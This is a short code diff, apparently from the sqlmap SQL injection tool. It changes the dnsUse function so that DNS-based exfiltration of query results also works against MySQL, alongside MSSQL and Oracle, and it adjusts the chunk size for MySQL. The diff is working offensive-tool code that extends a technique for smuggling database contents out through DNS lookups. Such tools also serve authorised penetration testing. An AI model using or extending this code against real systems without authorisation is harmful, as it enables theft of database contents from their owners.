@@ -52,7 +52,7 @@ def dnsUse(payload, expression):
     count = 0
     offset = 1
 
-    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE):
+    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL):
         output = hashDBRetrieve(expression, checkConf=True)
 
         if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
@@ -64,7 +64,7 @@ def dnsUse(payload, expression):
             while True:
                 count += 1
                 prefix, suffix = ("%s" % randomStr(3) for _ in xrange(2))
-                chunk_length = MAX_DNS_LABEL / 2 if Backend.isDbms(DBMS.ORACLE) else MAX_DNS_LABEL / 4 - 2
+                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL) else MAX_DNS_LABEL / 4 - 2
                 _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                 nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                 nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
